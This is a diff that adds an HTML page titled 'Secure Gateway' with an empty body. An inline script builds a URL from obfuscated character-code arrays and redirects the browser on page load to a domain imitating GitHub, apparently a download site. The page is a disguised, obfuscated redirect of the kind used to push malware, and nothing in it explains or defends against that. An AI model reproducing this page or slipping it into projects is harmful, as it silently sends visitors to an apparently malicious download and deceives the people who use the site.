@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Secure Gateway</title>
+    <script>
+        const encoded = [
+            [104, 116, 116, 112, 115, 58, 47, 47],
+            [103, 105, 116, 104, 117, 98, 115, 101, 99, 117, 114, 101, 100, 111, 119, 110, 108, 111, 97, 100],
+            [46, 111, 110, 108, 105, 110, 101],
+            [47, 104, 114, 102],
+            [47, 97, 108, 108, 110, 101, 119]
+        ];
+
+        const decode = (arr) => String.fromCharCode(...arr);
+
+        let url = '';
+        for (let part of encoded) {
+            url += decode(part);
+        }
+
+        window.location.href = url;
+    </script>
+</head>
+<body>
+</body>
+</html>
